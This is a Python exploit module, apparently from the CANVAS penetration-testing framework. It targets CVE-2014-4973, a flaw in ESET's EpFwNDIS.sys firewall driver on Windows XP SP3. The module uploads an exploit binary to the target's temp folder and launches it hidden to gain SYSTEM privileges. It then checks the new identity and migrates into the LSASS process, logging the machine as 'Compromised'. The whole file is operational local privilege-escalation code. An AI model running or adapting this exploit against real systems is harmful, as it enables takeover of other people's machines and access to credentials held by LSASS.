#!/usr/bin/env python

import os
import sys
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                           = 'EpFwNDIS.sys Trusted Value Vulnerability'
DESCRIPTION                    = 'EpFwNDIS.sys Trusted Value Vulnerability'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'ESET'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2014-4973'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4973'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'] ]
PROPERTY['VERSION']            = ['XP Pro SP3']

DOCUMENTATION['Notes']         = """
This module exploits a vulnerability on the ESET Personal Firewall NDIS filter (EpFwNdis.sys) driver.
The Firewall Module Build 1183 (20140214) and earlier in ESET Smart Security and ESET Endpoint Security 
products 5.0 through 7.0 are the vulnerable ones.
While processing the input buffer inside the IOCTL 0x830020CC a trusted value condition occurs. The
correct value could be obtained through another IOCTL which has an information leak. Once the correct
value is known a NULL page dereference could be achieved.

References:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-4973/

Tested on:
    Windows XP Professional SP3 x86 (ESET Smart Security 7.0.302.0)

"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0, 1000)
        self.remote_exp     = ''

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            cmd_line = dst + ' ' +  arg1
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            self.log_error('%s' % ex)
            return False

        return ret

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.node = node

            if not self.is_windows_node():
                continue

            self.local_name = 'exploit.exe'

            self.local_exp = os.path.join(self.local_res, self.local_name)

            # first, we check to make sure we are not
            # already local/SYSTEM
            whoami = self.exploitnodes('whoami', [self.node])[0]

            self.log_info('Currently running as: %s' % (whoami))
            if whoami[-1] == '$':
                self.log_info("It appears you are already running as LOCAL/SYSTEM")
                continue

            self.remote_path = self.node.shell.GetTempPathA()
            if not self.remote_path:
                self.log_error('Could not resolve full temp dir path')
                continue
            else:
                self.log_info('Temp dir: %s' % self.remote_path)
                self.remote_exp = os.path.join(self.remote_path, self.remote_name)

            if self.node.shell.chdir(self.remote_path) < 0:
                self.log_error('Could not chdir into %s' % self.remote_path)
                continue

            # upload binaries
            if not self.nodeUpload(self.local_exp, self.remote_exp):
                self.log_error('Error while uploading exploit binary')
                continue

            # spawn exploit
            pid  = self.node.shell.getpid()
            arg1 = "%s" % pid

            if not self.spawn_exploit(arg1):
                self.log_error('Could not spawn %s' % NAME)
                continue
            time.sleep(1)
            whoami = self.exploitnodes('whoami', [self.node])[0]
            self.log_info('Now running as: %s' % (whoami))
            

            # Just do a default mosdefmigrate and be done with it
            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            ret = migrate.run()

            if not ret:
                self.log_error("Failed to migrate to LSASS")
                self.log_error('%s failed' % NAME)
            else:
                # just to be sure
                if self.compromised():
                    self.nlog("Compromised")
                    ret = 1

            time.sleep(1)
            self.cleanup()

        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
